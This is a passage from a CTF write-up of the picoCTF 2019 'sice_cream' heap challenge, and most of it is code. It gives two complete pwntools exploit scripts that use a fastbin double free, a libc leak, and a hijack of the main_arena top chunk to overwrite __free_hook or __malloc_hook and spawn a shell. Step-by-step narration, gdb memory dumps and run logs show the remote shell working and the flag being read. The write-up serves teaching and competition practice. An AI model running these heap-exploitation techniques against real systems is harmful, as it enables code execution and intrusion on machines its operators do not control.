add(0x58, p64(fake_chunk) + 'A'*0x50) # 3

# Three more allocations, chunk 6 will be at our name variable
add(0x58, 'B'*0x58) # 4
add(0x58, 'A'*0x58) # 5
add(0x58, 'C'*0x58) # 6

# Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
reintroduce(p64(0) + p64(0x91) + p64(0x21)*23)

# Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
free(6)

# We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n<main_arena_addr+0x58>'
# We just format it correctly to get the leak
leak = u64(reintroduce('A'*(0x8+0x7) + '\n').split('\n')[1][:-1].ljust(8, '\x00'))

# Calculate all offsets needed
main_arena = leak - 0x58
libc.address = leak - 0x3c4b78
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Leak: ' + hex(leak))
log.info('main arena: ' + hex(main_arena))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))
```

#### Step 2: **Overwrite __free_hook, but HOW?**

Here is where the exploit gets very interesting. Here is what I tried initially:

1. I tried your standard fastbin attack to get a chunk above `__malloc_hook`, but quickly realized that due to the 0x58 size constraint, this was not possible. We'd need to be able to allocate chunks of size 0x60-0x68 to be able to do this attack (FAILED).

2. Then, I tried to overwrite `_IO_2_1_stdin_`'s `_IO_BUF_END` to the address of `main_arena + 0x58` by doing the unsorted bin attack. The idea was that after doing this, any user input performed using `scanf` would use the space between `_IO_BUF_BASE` and `_IO_BUF_END` to store our input. We could overwrite `__malloc_hook` this way, since `_IO_BUF_BASE` is set to right above `__malloc_hook`, and `main_arena + 0x58` is way after `__malloc_hook`. However, of course the program only uses `read` to read in user input and not `scanf`, therefore this didn't work either (FAILED).

3. Then, I tried to do the House of Orange attack. However, I've actually never done that attack before, and from my limited knowledge of it, it seemed like the 0x58 size constraint prevented me from doing that attack as well (FAILED).

I spent about a day and a half doing all of that, and kept trying to look for similar writeups. I was then told by NotDeGhost from redpwn that the author `poortho` had made a similar challenge in the past. A little bit of doxxing and I found this one writeup of `hard_heap` from HSCTF-6, which had a broken link, but I could go on the author's github and download the `index.html` file that was used for the writeup and then view it in Firefox.

This person did this brilliant attack where they overwrote the top chunk pointer in the `main_arena` to `__malloc_hook - 0x15`. What happens then is that any request for memory that has to be serviced using the top chunk will give a chunk at `__malloc_hook - 0x15`, which can be used to overwrite `__malloc_hook`.

The only constraint here is that the address we overwrite the top chunk pointer with must have chunk metadata right above it that makes it look like the top chunk. If you are unsure what that looks like, you may view my writeup of [message_saver](/2019-09-30-bsides-delhi-message-saver/) to see how it looks like in memory.
```c
struct malloc_state
{
  /* Serialize access.  */
  mutex_t mutex;

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top; <-.
  //  We overwrite this pointer to change the location of the top chunk in memory

	...
```

Of course when I tried to do the same thing, none of the one gadgets worked. It would be a bad challenge if it was exactly the same as his previous challenge right? So I had to come up with something else. NotDeGhost had also told me that it was possible to overwrite `__free_hook` somehow, and after a while, this is the solution I came up with:

First, using the leaked `__free_hook` address, I tried to see if there was a place above `__free_hook` where I could point the top chunk pointer to. After a bunch of trial and error, I found this:
```c
// __free_hook = 0x7f7b4adaa7a8
gef➤  x/20gx 0x7f7b4adaa7a8 - 0x1100 + 0x70 - 0x5 - 0x10
0x7f7b4ada9703 <stderr+3>:      0xda962000007f7b4a      0xda88e000007f7b4a <--.
0x7f7b4ada9713 <stdin+3>:       0xa04b7000007f7b4a      0x00000000007f7b4a    |
0x7f7b4ada9723: 0x0000000000000000      0x0000000000000000      looks like top chunk header
0x7f7b4ada9733: 0x0000000000000000      0x0000000000000000   
0x7f7b4ada9743: 0x0000000000000000      0x0000000000000000   
0x7f7b4ada9753: 0x0000000000000000      0x0000000000000000   
0x7f7b4ada9763: 0x0000000000000000      0x0000000000000000
0x7f7b4ada9773: 0x0000000000000000      0x0000000000000000
0x7f7b4ada9783: 0x0000000000000000      0x0000000000000000
0x7f7b4ada9793: 0x0000000000000000      0x0000000000000000
```

At `__free_hook - 0x1100 + 0x70 - 0x5`, we have a valid location to overwrite the top chunk pointer with. The idea for me here was that I would change the top chunk's location in memory to here, and then allocate enough chunks to the point where I get a chunk right on top of `__free_hook`, and then overwrite it with the address of `system`.

After that, if I call `free(chunkptr)`, it will actually call `((*)__free_hook)(chunkptr, ...)`, which gets converted to `system(chunkptr)`. If the first 8 bytes of `chunkptr` in our example happen to be `/bin/sh\x00`, it will call `system("/bin/sh\x00")`. Just what we need.
```c
void
__libc_free (void *mem) // mem is the pointer to the chunk we free
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0)); // <- we can overwrite hook to point to system
      return;
    }
```

#### So how do we do it?

First step is to empty out the unsorted bin. This is because the fake chunk that we have on the name variable is very important for this exploit. We'll be modifying it numerous times, which is guaranteed to corrupt the unsorted bin, therefore we empty it now to prevent the program from trying to get any chunks out of a corrupted unsorted bin.

I do this by first changing its size to 0x61, then allocating a 0x58 sized chunk.
```python
# We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
reintroduce(p64(0) + p64(0x61) + p64(leak) + p64(leak) + p64(0)*9 + p64(0x21))
add(0x58, 'A'*0x58) # 7
```

Next, I fake a 0x20 sized chunk and free it. This will fill up the 0x20 sized fastbin in `main_arena`. Since this fake chunk has an address starting with 0x60 (due to our name array being at the address 0x602040), we can get a fake chunk right inside `main_arena`.

I also fake a 0x61 sized chunk and free that in preparation for the fastbin attack that we will do to get the chunk in `main_arena`. Notice how useful this name variable is being?
```python
# We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
reintroduce(p64(0) + p64(0x31) + p64(0x21)*8)
free(6)

# Now we free a 0x61 sized chunk to prepare for the fastbin attack
reintroduce(p64(0) + p64(0x61) + p64(0x21)*18)
free(6)

# This is the address where the 0x602040 address from above looks 16 byte aligned
fake_chunk_top = main_arena + 0x10 - 0x6
```
```c
// main_arena = 0x7f19ee5d4b20
gef➤  x/12gx 0x7f19ee5d4b20          .--------------------- Our freed 0x20 chunk
0x7f19ee5d4b20: 0x0000000000000000   |  0x0000000000000000
0x7f19ee5d4b30: 0x0000000000602040 <-   0x0000000000000000
0x7f19ee5d4b40: 0x0000000000000000      0x0000000000602040 <-.
0x7f19ee5d4b50: 0x0000000000000000      0x0000000000000000 Freed 0x60 chunk in preparation
0x7f19ee5d4b60: 0x0000000000000000      0x0000000000000000 for the fastbin attack
0x7f19ee5d4b70: 0x0000000000000000      0x00000000011e3120
gef➤  x/12gx 0x7f19ee5d4b20 + 0x10 - 0x6
0x7f19ee5d4b2a: 0x2040000000000000      0x0000000000000060 <- looks like a fake chunk
0x7f19ee5d4b3a: 0x0000000000000000      0x2040000000000000
0x7f19ee5d4b4a: 0x0000000000000060      0x0000000000000000
0x7f19ee5d4b5a: 0x0000000000000000      0x0000000000000000
0x7f19ee5d4b6a: 0x0000000000000000      0x3120000000000000
0x7f19ee5d4b7a: 0x000000000000011e      0x4b78000000000000
```

Next, we simply do the fastbin attack again to get a chunk in `main_arena`. Using gdb, the offset can be found by trial and error, and then you can overwrite the top chunk pointer to `__free_hook - 0x1100 + 0x70 - 0x5`. Ensure to not put anything but NULL bytes inside `main_arena` before the top chunk pointer. Any other bytes will be treated as an address existing in a fastbin, which corrupts the fastbin and will for sure later crash your program.
```python
# We set our fake chunk's fd pointer to point to our fake chunk in main arena
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_top) + p64(0))

# Chunk 9 will be in main arena, we overwrite it with free_hook-0x1100+0x70-0x5
# If you look at that address-0x10, it looks like the top chunk header
# So we set the top chunk pointer to that address (free_hook-0x1100+0x70-0x5)
add(0x50, 'B'*0x50) # 8
add(0x50, '\x00'*0x3e + p64(free_hook - 0x1100 + 0x70 - 0x5)) # 9

# Now the next chunk was a test to see if it worked
# This chunk should be placed at free_hook-0x1100+0x70-0x5
add(0x58, 'A'*8) # 10
```
```c
// __free_hook = 0x7fb3d8f0a7a8
gef➤  x/10gx 0x7fb3d8f0a7a8 - 0x1100 + 0x70 - 0x5 - 0x10
0x7fb3d8f09703 <stderr+3>:      0xf0962000007fb3d8      0xf088e000007fb3d8 <-.
0x7fb3d8f09713 <stdin+3>:       0xb64b7000007fb3d8      0x0000000000000061   |
0x7fb3d8f09723: 0x4141414141414141      0x0000000000000000   ^   looks like top chunk
0x7fb3d8f09733: 0x0000000000000000      0x0000000000000000   |
0x7fb3d8f09743: 0x0000000000000000      0x0000000000000000 theres our new chunk header
```

Now we take a quick detour. I realized that the number of chunks we'd need to allocate was way over 19, which is what the program limits us to. However, I realized it was very easy to forge a fake chunk right above the global array of chunks, and then get a chunk there using a fastbin attack in order to overwrite a bunch of indexes of that array with NULL. Having PIE disabled makes this very easy.
```python
# Next, my plan was to do enough mallocs so we can reach free_hook from free_hook-0x1100 ...
# The program however has a limit of 19 chunks
# I bypass it by getting a chunk right above the global array of chunks
# I then zero out the first 11 indexes of that array

# Address of the fake chunk above the array
fake_chunk_above_array = 0x602130

# Change the name so that it places a fake chunk header right at that address from above
reintroduce(p64(0) + p64(0x61) + p64(0)*11 + p64(0x21) + p64(0)*17 + p64(0x61))

# Free the fake_chunk at the name
free(6)

# Overwrite its fd with the address of our fake chunk above the global array
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

# Chunk 12 will be above the global array, zero out a bunch of indexes
add(0x58, 'A'*0x58) # 11
add(0x58, p64(0)*11) # 12, Free up indexes 0-10

# Now there is a reference to fake_chunk (at our name variable) at idx 11
# This can easily be verified by viewing the array in gdb
```
```c
gef➤  x/100gx 0x602040
0x602040:       0x0000000000000000      0x0000000000000061 <- name variable
0x602050:       0x4141414141414141      0x4141414141414141
...
0x602090:       0x4141414141414141      0x4141414141414141
0x6020a0:       0x4141414141414141      0x0000000000000021 <- fake chunk allows us to free
0x6020b0:       0x0000000000000000      0x0000000000000000
...
0x602120:       0x0000000000000000      0x0000000000000000
0x602130:       0x0000000000000000      0x0000000000000061 <- chunk above global array
0x602140:       0x0000000000000000      0x0000000000000000 <- global array
0x602150:       0x0000000000000000      0x0000000000000000 <- We made NULL
0x602160:       0x0000000000000000      0x0000000000000000 <- We made NULL
0x602170:       0x0000000000000000      0x0000000000000000 <- We made NULL
0x602180:       0x0000000000000000      0x0000000000000000 <- We made NULL
0x602190:       0x0000000000000000      0x0000000000602050 <- idx 11
0x6021a0:       0x0000000000602140      0x0000000000000000
...
```

The next part was a bit of trial and error. I found out that I would need to do 51 allocations of size 0x48 to get right above `__free_hook`. The 52nd allocation of size 0x48 can be used to overwrite `__free_hook` to the address of `system`.

Each time I allocate a new chunk, I also immediately zero out the first 11 indexes of the global array. Of course this is overkill, but I was being lazy.
```python
# Now there is a reference to fake_chunk (at our name) at idx 11
# This can easily be verified by viewing the array in gdb

# Now, this was a bit of trial and error, but I found out that 51 allocations of size 0x48
# was enough to reach just above __free_hook
# Each time we allocate, we zero out the global array immediately
for i in range(51):
    # Allocate using top chunk
    add(0x48, '\x00'*0x48)

    # Redo the fastbin attack to get a chunk above the global array

    # Free our fake_chunk on the name
    free(11)

    # Change fd to point to fake_chunk_above_array
    reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

    # Two more allocations, zero out the indexes
    add(0x58, 'A'*0x58)
    add(0x58, p64(0)*11)

# After 51 allocations, we can overwrite __free_hook with system
# We have to keep null bytes before it, otherwise the program will crash (I don't know why)
add(0x48, '\x00'*0x35 + p64(system))
```

After this, I simply reset the name variable's first 8 bytes to `'/bin/sh\x00'`, and then freed it. This calls `system("/bin/sh\x00")`, as explained above.
```python
# Then just put '/bin/sh\x00' into our name array
reintroduce(p64(0) + p64(0x61) + '/bin/sh\x00')

# Call free(fake_chunk), which calls system(fake_chunk), which calls system('/bin/sh\x00')
free(11)

p.interactive()
```

#### So what is the other solution?

The other solution is based upon the fact that when you double free a chunk and cause a `double free or corruption (fasttop)` error, it will actually call `malloc` internally. I found out about this from [this blog post](https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/).

If you cause a double free, the subsequent call to `malloc` actually meets one of our one gadget's constraints, and thus the solution is then much easier: overwrite the top chunk pointer to `__malloc_hook - 0x15` and then overwrite `__malloc_hook` with the working one gadget and cause a double free to get shell.

The exploit for that is showcased at the very end of this post.

### **Final Exploit**

If you want to run this exploit remotely, you should move it to the shell server first. The 51 allocations don't play well unless your internet is extremely fast, unlike mine ^_^
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './sice_cream'
HOST, PORT = '2019shell1.picoctf.com', 38495

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(name):
    p.sendlineafter('> ', name)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def reintroduce(name):
    p.sendlineafter('> ', '3')
    p.sendafter('> ', name)
    return p.recvuntil('1.')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''

# Initialize our name to look like a fake chunk header with size 0x61
initialize(p64(0) + p64(0x61) + p64(0))

# Address of name global variable (PIE is disabled)
fake_chunk = 0x602040

# Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
add(0x58, 'A'*0x58) # 0
add(0x58, 'B'*0x58) # 1
add(0x58, 'C'*0x58) # 2

# Double free chunk 0
free(0)
free(1)
free(0)

# Get chunk 0 back, and overwrite it's FD with fake chunk
add(0x58, p64(fake_chunk) + 'A'*0x50) # 3

# Three more frees, chunk 6 will be at name
add(0x58, 'B'*0x58) # 4
add(0x58, 'A'*0x58) # 5
add(0x58, 'C'*0x58) # 6

# Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
reintroduce(p64(0) + p64(0x91) + p64(0x21)*23)

# Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
free(6)

# We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n<main_arena_addr>'
# We just format it correctly to get the leak
leak = u64(reintroduce('A'*(0x8+0x7) + '\n').split('\n')[1][:-1].ljust(8, '\x00'))

# Calculate all offsets needed
main_arena = leak - 0x58
libc.address = leak - 0x3c4b78
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Leak: ' + hex(leak))
log.info('main arena: ' + hex(main_arena))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))

'''
This next step is just crazy. I had no idea how to go about getting a chunk on malloc_hook
due to the 0x58 allocation size constraint. Getting a chunk on __free_hook was out of the
question. I spent about a day trying to do a version of the House of Orange from HITCON
CTF 2016, but failed to do so due to the size constraints again.

The next day, NotDeGhost from redpwn hinted me towards the fact that poortho (the author of
this challenge) had created a similar challenge before, so I looked him up and found a
couple writeups of his challenge hard_heap from HSCTF-6.

Basically, in the main arena of libc, there is a pointer known as the top pointer that
exists right after the fastbins. This pointer essentially points to the memory address
that gets used whenever the top chunk is used to service allocations. If we can change
this top pointer and have it point to some other memory region, any allocations that
need to use the top chunk will now give us allocations at that memory address.

The only restriction is that this new memory address must look similar to what the top chunk
header looks like.

I first tried to get a chunk on malloc_hook, however none of the one_gadgets worked, so I
had to come up with something else.

NotDeGhost again told me that it is possible to get a chunk on free_hook, and I was
dumbstruck. Took me a while but I realized how to do it.

The solution will amaze you for sure.
'''

# We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
reintroduce(p64(0) + p64(0x61) + p64(leak) + p64(leak) + p64(0)*9 + p64(0x21))
add(0x58, 'A'*0x58) # 7

# We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
reintroduce(p64(0) + p64(0x31) + p64(0x21)*8)
free(6)

# Now we free a 0x61 sized chunk to prepare for the fastbin attack
reintroduce(p64(0) + p64(0x61) + p64(0x21)*18)
free(6)

# This is the address where the 0x602040 address from above looks 16 byte aligned
fake_chunk_top = main_arena + 0x10 - 0x6

# We set our fake chunk's fd pointer to point to our fake chunk in main arena
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_top) + p64(0))

# Chunk 9 will be in main arena, we overwrite it with free_hook-0x1100+0x70-0x5
# If you look at that address-0x10, it looks like the top chunk header
# So we set the top chunk pointer to that address (free_hook-0x1100+0x70-0x5)
add(0x50, 'B'*0x50) # 8
add(0x50, '\x00'*0x3e + p64(free_hook - 0x1100 + 0x70 - 0x5)) # 9

# Now the next chunk was a test to see if it worked
# This chunk should be placed at free_hook-0x1100+0x70-0x5
add(0x58, 'A'*8) # 10

# Next, my plan was to do enough mallocs so we can reach free_hook from free_hook-0x1100 ...
# The program however has a limit of 19 chunks
# I bypass it by getting a chunk right above the global array of chunks
# I then zero out the first 11 indexes of that array

# Address of the fake chunk above the array
fake_chunk_above_array = 0x602130

# Change the name so that it places a fake chunk header right at that address from above
reintroduce(p64(0) + p64(0x61) + p64(0)*11 + p64(0x21) + p64(0)*17 + p64(0x61))

# Free the fake_chunk at the name
free(6)

# Overwrite its fd with the address of our fake chunk above the global array
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

# Chunk 12 will be above the global array, zero out a bunch of indexes
add(0x58, 'A'*0x58) # 11
add(0x58, p64(0)*11) # 12, Free up indexes 0-10

# Now there is a reference to fake_chunk (at our name) at idx 11
# This can easily be verified by viewing the array in gdb

# Now, this was a bit of trial and error, but I found out that 51 allocations of size 0x48
# was enough to reach just above __free_hook
# Each time we allocate, we zero out the global array immediately
for i in range(51):
    # Allocate using top chunk
    add(0x48, '\x00'*0x48)

    # Redo the fastbin attack to get a chunk above the global array

    # Free our fake_chunk on the name
    free(11)

    # Change fd to point to fake_chunk_above_array
    reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

    # Two more allocations, zero out the indexes
    add(0x58, 'A'*0x58)
    add(0x58, p64(0)*11)

# After 51 allocations, we can overwrite __free_hook with system
# We have to keep null bytes before it, otherwise the program will crash (I don't know why)
add(0x48, '\x00'*0x35 + p64(system))

# Then just put '/bin/sh\x00' into our name array
reintroduce(p64(0) + p64(0x61) + '/bin/sh\x00')

# Call free(fake_chunk), which calls system(fake_chunk), which calls system('/bin/sh\x00')
free(11)

p.interactive()
```
```sh
redacted@pico-2019-shell1:~$ python2 exploit.py REMOTE
[*] '/home/warlock/sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
[*] '/home/warlock/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2019shell1.picoctf.com on port 38495: Done
[*] Leak: 0x7f1df256eb78
[*] main arena: 0x7f1df256eb20
[*] Libc base: 0x7f1df21aa000
[*] system: 0x7f1df21ef390
[*] __free_hook: 0x7f1df25707a8
[*] Switching to interactive mode
$ ls
flag.txt
ld-2.23.so
libc.so.6
sice_cream
xinet_startup.sh
$ cat flag.txt
flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_ac8fd349}$
```

### **Other Exploit**

This one can actually be ran on a local machine since it doesn't take nearly as long ^_^
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './sice_cream'
HOST, PORT = '2019shell1.picoctf.com', 38495

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(name):
    p.sendlineafter('> ', name)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def reintroduce(name):
    p.sendlineafter('> ', '3')
    p.sendafter('> ', name)
    return p.recvuntil('1.')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''

# Initialize our name to look like a fake chunk header with size 0x61
initialize(p64(0) + p64(0x61) + p64(0))

# Address of name global variable (PIE is disabled)
fake_chunk = 0x602040

# Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
add(0x58, 'A'*0x58) # 0
add(0x58, 'B'*0x58) # 1
add(0x58, 'C'*0x58) # 2

# Double free chunk 0
free(0)
free(1)
free(0)

# Get chunk 0 back, and overwrite it's FD with fake chunk
add(0x58, p64(fake_chunk) + 'A'*0x50) # 3

# Three more frees, chunk 6 will be at name
add(0x58, 'B'*0x58) # 4
add(0x58, 'A'*0x58) # 5
add(0x58, 'C'*0x58) # 6

# Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
reintroduce(p64(0) + p64(0x91) + p64(0x21)*23)

# Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
free(6)

# We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n<main_arena_addr>'
# We just format it correctly to get the leak
leak = u64(reintroduce('A'*(0x8+0x7) + '\n').split('\n')[1][:-1].ljust(8, '\x00'))

# Calculate all offsets needed
main_arena = leak - 0x58
libc.address = leak - 0x3c4b78
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
malloc_hook = libc.symbols['__malloc_hook']
one_gadget = libc.address + 0xf02a4

log.info('Leak: ' + hex(leak))
log.info('main arena: ' + hex(main_arena))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))
log.info('__malloc_hook: ' + hex(malloc_hook))
log.info('one_gadget: ' + hex(one_gadget))

'''
Same as the other exploit, except this time we overwrite the top chunk pointer
to the address of `__malloc_hook - 0x15`. We then request a chunk such that
it is serviced by the top chunk.

Then, just overwrite `__malloc_hook` with our working one gadget, and cause
a double free error. The double free error will call these functions in order:

free -> __libc_free -> _int_free -> malloc_printerr -> __libc_message
-> backtrace_and_maps -> init -> dlerror_run -> _dl_catch_error
-> _dl_open -> _dl_catch_error -> dl_open_worker -> _dl_map_object
-> _dl_load_cache_lookup -> __strdup

__strdup will use malloc to do its string duplication
'''

# We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
reintroduce(p64(0) + p64(0x61) + p64(leak) + p64(leak) + p64(0)*9 + p64(0x21))
add(0x58, 'A'*0x58) # 7

# We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
reintroduce(p64(0) + p64(0x31) + p64(0x21)*8)
free(6)

# Prepare for the fastbin attack: free a 0x61 sized chunk
reintroduce(p64(0) + p64(0x61) + p64(0x21)*18)
free(6)

# This is the address where the 0x602040 address from above looks 16 byte aligned
fake_chunk_top = main_arena + 0x10 - 0x6

# We set our fake chunk's fd pointer to point to our fake chunk in main arena
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_top) + p64(0))

# Chunk 9 will be in main arena, we overwrite the top chunk ptr with malloc_hook-0x15
# If you look at that malloc_hook-0x25, it looks like the top chunk header
# So we set the top chunk pointer to that address (malloc_hook-0x15)
add(0x50, 'B'*0x50) # 8
add(0x50, '\x00'*0x3e + p64(malloc_hook - 0x15))

# Now overwrite with one gadget
add(0x58, '\x00'*5 + p64(one_gadget))

# Do a double free, this will end up calling malloc.
free(0)
free(0)

p.interactive()

```
```sh
vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2019shell1.picoctf.com on port 38495: Done
[*] Leak: 0x7f61ebcbdb78
[*] main arena: 0x7f61ebcbdb20
[*] Libc base: 0x7f61eb8f9000
[*] system: 0x7f61eb93e390
[*] __free_hook: 0x7f61ebcbf7a8
[*] __malloc_hook: 0x7f61ebcbdb10
[*] one_gadget: 0x7f61eb9e92a4
[*] Switching to interactive mode
*** Error in `/problems/sice-cream_4_7ef8903b2c31d9f08c4ad7bcdcb5f0d3/sice_cream': double free or corruption (fasttop): 0x0000000001500010 ***
$ ls
flag.txt
ld-2.23.so
libc.so.6
sice_cream
xinet_startup.sh
$ cat flag.txt
flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_ac8fd349}$  
```
